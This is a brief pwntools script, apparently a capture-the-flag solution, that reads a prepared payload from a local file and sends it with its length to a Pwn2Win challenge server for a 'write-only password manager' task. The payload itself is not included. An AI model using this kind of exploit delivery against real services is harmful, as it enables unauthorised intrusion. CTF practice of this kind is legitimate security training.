from pwn import *

fd = open('lol','r')

data = fd.read(10000)
fd.close()



p = remote('baby-writeonly-password-manager.pwn2win.party',1337)

p.sendlineafter(")\n",str(len(data)))
p.send(data)


